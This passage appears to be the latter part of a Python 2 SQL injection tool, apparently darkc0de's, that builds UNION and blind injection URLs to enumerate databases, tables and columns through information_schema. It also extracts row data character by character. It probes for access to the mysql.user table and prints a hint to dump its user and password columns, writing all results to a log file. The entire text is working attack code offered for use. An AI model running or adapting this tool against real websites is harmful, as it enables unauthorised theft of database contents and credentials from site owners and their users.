                        line_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema=0x"+arg_database.encode("hex")+"+AND+table_name+=+0x"+arg_table.encode("hex")
                        count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
                        count_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema=0x"+arg_database.encode("hex")+"+AND+table_name+=+0x"+arg_table.encode("hex")
		arg_row = "Columns"

elif mode == "--dump":                
	print "[+] Dumping data from database \""+str(arg_database)+"\" Table \""+str(arg_table)+"\""
	file.write("\n[+] Dumping data from database \""+str(arg_database)+"\" Table \""+str(arg_table)+"\"")
        print "[+] and Column(s) "+str(arg_columns);file.write("\n[+] Column(s) "+str(arg_columns))
        if arg_blind == "--blind":
                darkc0de = ""
                for column in arg_columns:
                        darkc0de += column+",0x3a,"
                darkc0de = darkc0de.rstrip("0x3a,")
                count_URL = site+"+and+((SELECT+COUNT(*)+FROM+"+arg_database+"."+arg_table
                line_URL = site+"+and+ascii(substring((SELECT+concat("+darkc0de+")+FROM+"+arg_database+"."+arg_table
        else:
                for column in arg_columns:
                        darkc0de += column+",0x1e,"
                count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")+"+FROM+"+arg_database+"."+arg_table
                line_URL = site.replace("darkc0de",darkc0de+"0x1e,0x20)")+"+FROM+"+arg_database+"."+arg_table
        if arg_where != "" or arg_orderby != "":
                if arg_where != "":
                        arg_where = arg_where.split(",")
                        print "[+] WHERE clause:","\""+arg_where[0]+"="+arg_where[1]+"\""
                        arg_where = "WHERE+"+arg_where[0]+"="+"0x"+arg_where[1].encode("hex")
                if arg_orderby != "":
                        arg_orderby = "ORDER+BY+'"+arg_orderby+"'"
                        print "[+] ORDERBY clause:",arg_orderby
                count_URL += "+"+arg_where
                line_URL += "+"+arg_where+"+"+arg_orderby
        if version[0] == 4:
                count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")+"+FROM+"+arg_table
        	line_URL = site.replace("darkc0de",darkc0de+"0x1e,0x20)")+"+FROM+"+arg_table

elif mode == "--full":
	print "[+] Starting full SQLi information_schema enumeration..."
	line_URL = site.replace("darkc0de","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)")
	line_URL += "+FROM+information_schema.columns+WHERE+table_schema!=0x"+"information_schema".encode("hex")
        count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
        count_URL += "+FROM+information_schema.columns+WHERE+table_schema!=0x"+"information_schema".encode("hex")
		
elif mode == "--dbs":
	print "[+] Showing all databases current user has access too!"
	file.write("\n[+] Showing all databases current user has access too!")
        if arg_blind == "--blind":
                count_URL = site+"+and+((SELECT+COUNT(schema_name)"
                count_URL += "+FROM+information_schema.schemata+where+schema_name+!=+0x"+"information_schema".encode("hex")+"))"
                line_URL = site+"+and+ascii(substring((SELECT+schema_name"
                line_URL += "+from+information_schema.schemata+where+schema_name+!=+0x"+"information_schema".encode("hex")
        else:
                count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
                count_URL += "+FROM+information_schema.schemata+WHERE+schema_name!=0x"+"information_schema".encode("hex")
                line_URL = site.replace("darkc0de","concat(0x1e,0x1e,schema_name,0x1e,0x20)")
                line_URL += "+FROM+information_schema.schemata+WHERE+schema_name!=0x"+"information_schema".encode("hex")
	arg_row = "Databases"

if arg_blind == "--blind":
        count_URL+="))"
        line_URL+="+LIMIT+"
else:
        count_URL += arg_end
        line_URL += "+LIMIT+NUM,1"+arg_end
        
## Blind Info --- I know it doesnt make sence where this code is.. but.. fuck it...
if mode == "--info" and arg_blind == "--blind":
        head_URL = site+"+and+(SELECT+1+from+mysql.user+limit+0,1)=1"
        source = GetThatShit(head_URL)
        match = re.findall(arg_string,source)
        if len(match) >= 1:
                yesno = "YES <-- w00t w00t\n[!] Retrieve Info: --dump -D mysql -T user -C user,password"
        else:
                yesno = "NO"
        print "\n[+] Do we have Access to MySQL Database:",yesno;file.write("\n\n[+] Do we have Access to MySQL Database: "+str(yesno))
        print "\n[+] Showing database version, username@location, and database name!"
	file.write("\n\n[+] Showing database version, username@location, and database name!")
	line_URL = site+"+and+ascii(substring((SELECT+concat(version(),0x3a,user(),0x3a,database())),"
        row_value = 1

#Lets Count how many rows or columns
if mode == "--schema" or mode == "--dump" or mode == "--dbs" or mode == "--full":
        if arg_blind == "--blind":
                row_value = GuessValue(count_URL)
        else:
                source = GetThatShit(count_URL)
                match = re.findall("\x1e\x1e\S+",source)
                match = match[0][2:].split("\x1e")
                row_value = match[0]
        print "[+] Number of "+arg_row+": "+str(row_value);file.write("\n[+] Number of "+arg_row+": "+str(row_value)+"\n")

## UNION Schema Enumeration and DataExt loop
if arg_blind == "--union":
        if mode == "--schema" or mode == "--dump" or mode == "--dbs" or mode == "--full":
                while int(table_num) != int(row_value):
                        try:
                                source = GetThatShit(line_URL.replace("NUM",str(num)))
                                match = re.findall("\x1e\x1e\S+",source)
                                if len(match) >= 1:
                                        if mode == "--schema" or mode == "--full":
                                                match = match[0][2:].split("\x1e")
                                                if cur_db != match[0]:			
                                                        cur_db = match[0]
                                                        if table_num == 0:
                                                                print "\n[Database]: "+match[0];file.write("\n[Database]: "+match[0]+"\n")
                                                        else:
                                                                print "\n\n[Database]: "+match[0];file.write("\n\n[Database]: "+match[0]+"\n")
                                                        print "[Table: Columns]";file.write("[Table: Columns]\n")
                                                if cur_table != match[1]:
                                                        print "\n["+str(table_num+1)+"]"+match[1]+": "+match[2],
                                                        file.write("\n["+str(table_num+1)+"]"+match[1]+": "+match[2])
                                                        cur_table = match[1]
                                                        #table_num+=1
                                                        table_num = int(table_num) + 1
                                                else:
                                                        sys.stdout.write(",%s" % (match[2]))
                                                        file.write(","+match[2])
                                                        sys.stdout.flush()
                                        #Gathering Databases only
                                        elif mode == "--dbs":                                        
                                                match = match[0]
                                                if table_num == 0:
                                                        print "\n["+str(num+1)+"]",match;file.write("\n["+str(num+1)+"]"+str(match))
                                                else:
                                                        print "["+str(num+1)+"]",match;file.write("\n["+str(num+1)+"]"+str(match))
                                                table_num+=1
                                        #Collect data from tables & columns
                                        elif mode == "--dump":
                                                match = re.findall("\x1e\x1e+.+\x1e\x1e",source)
                                                if match == []:
                                                        match = ['']
                                                else:
                                                        match = match[0].strip("\x1e").split("\x1e")
                                                if arg_rowdisp == 1:
                                                        print "\n["+str(num+1)+"] ",;file.write("\n["+str(num+1)+"] ",)
                                                else:
                                                        print;file.write("\n")
                                                for ddata in match:
                                                        if ddata == "":
                                                                ddata = "NoDataInColumn"
                                                        sys.stdout.write("%s:" % (ddata))
                                                        file.write("%s:" % ddata)
                                                        sys.stdout.flush()
                                                table_num+=1
                                else:
                                        if mode == "--dump":
                                                table_num+=1
                                                sys.stdout.write("\n[%s] No data" % (num))
                                                file.write("\n[%s] No data" % (num))
                                        break
                                num+=1
                        except (KeyboardInterrupt, SystemExit):
                                raise
                        except:
                                pass

## Blind Schema Enumeration and DataExt loop
if arg_blind == "--blind":
        if mode == "--schema" or mode == "--dbs" or mode == "--dump" or mode == "--info":
                lower_bound = 0
                upper_bound = 127
                print
                for data_row in range(int(num), row_value):
                        sys.stdout.write("[%s]: " % (lim_num))
                        file.write("\n[%s]: " % (lim_num))
                        sys.stdout.flush()
                        value = chr(upper_bound)
                        while value != chr(0):
                                if mode == "--info":
                                        Guess_URL = line_URL + str(let_pos)+",1))"
                                else:
                                        Guess_URL = line_URL + str(lim_num) +",1),"+str(let_pos)+",1))"
                                value = chr(GuessValue(Guess_URL))
                                sys.stdout.write("%s" % (value))
                                file.write(value)
                                sys.stdout.flush()
                                let_pos+=1
                        print
                        lim_num = int(lim_num) + 1
                        let_pos = 1
                        data_row+=1

#Lets wrap it up!
if mode == "--schema" or mode == "--full" or mode == "--dump":
        print "\n\n[-] %s" % time.strftime("%X");file.write("\n\n[-] [%s]" % time.strftime("%X"))
else:
        print "\n[-] %s" % time.strftime("%X");file.write("\n\n[-] [%s]" % time.strftime("%X"))
print "[-] Total URL Requests:",gets;file.write("\n[-] Total URL Requests: "+str(gets))
print "[-] Done\n";file.write("\n[-] Done\n")
print "Don't forget to check", logfile,"\n"
file.close()
